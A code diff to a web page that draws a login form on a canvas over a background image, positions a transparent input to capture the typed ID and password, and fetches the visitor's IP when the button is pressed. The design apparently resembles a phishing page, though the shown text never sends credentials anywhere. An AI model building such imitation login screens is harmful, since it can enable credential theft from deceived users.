@@ -13,19 +13,20 @@
 
     #hiddenInput {
       position: absolute;
-      left: -1000px; /* off-screen */
+      background: transparent;
+      border: none;
+      color: transparent;
+      caret-color: black;
+      font-size: 28px;
+      z-index: 10;
       opacity: 0;
-      z-index: 0;
-      pointer-events: auto;
-      autocapitalize: none;
-      autocomplete: off;
     }
   </style>
 </head>
 <body>
 
 <canvas id="loginCanvas" width="720" height="1402"></canvas>
-<input type="text" id="hiddenInput" />
+<input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" />
 
 <script>
 const canvas = document.getElementById('loginCanvas');
@@ -46,7 +47,7 @@ const bgImage = new Image();
 bgImage.src = 'background.png';
 bgImage.onload = () => draw();
 
-// Cursor blink logic
+// Cursor blink
 let cursorVisible = true;
 setInterval(() => {
   cursorVisible = !cursorVisible;
@@ -116,6 +117,15 @@ function isInside(x, y, box) {
          y >= box.y && y <= box.y + box.height;
 }
 
+function positionHiddenInputOver(box) {
+  const rect = canvas.getBoundingClientRect();
+  hiddenInput.style.left = rect.left + box.x + 14 + 'px';
+  hiddenInput.style.top = rect.top + box.y + 20 + 'px';
+  hiddenInput.style.width = (box.width - 28) + 'px';
+  hiddenInput.style.height = (box.height - 40) + 'px';
+  hiddenInput.style.opacity = 1;
+}
+
 function handleTouch(e) {
   const rect = canvas.getBoundingClientRect();
   const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
@@ -126,16 +136,19 @@ function handleTouch(e) {
     loginActivated = true;
     passActivated = false;
     hiddenInput.value = loginID;
+    positionHiddenInputOver(loginBox);
     hiddenInput.focus();
   } else if (isInside(x, y, passBox)) {
     activeInput = 'pass';
     passActivated = true;
     loginActivated = false;
     hiddenInput.value = password;
+    positionHiddenInputOver(passBox);
     hiddenInput.focus();
   } else if (isInside(x, y, buttonBox)) {
     activeInput = null;
     hiddenInput.blur();
+    hiddenInput.style.opacity = 0;
 
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -171,6 +184,7 @@ function handleTouch(e) {
     loginActivated = false;
     passActivated = false;
     hiddenInput.blur();
+    hiddenInput.style.opacity = 0;
   }
 
   draw();
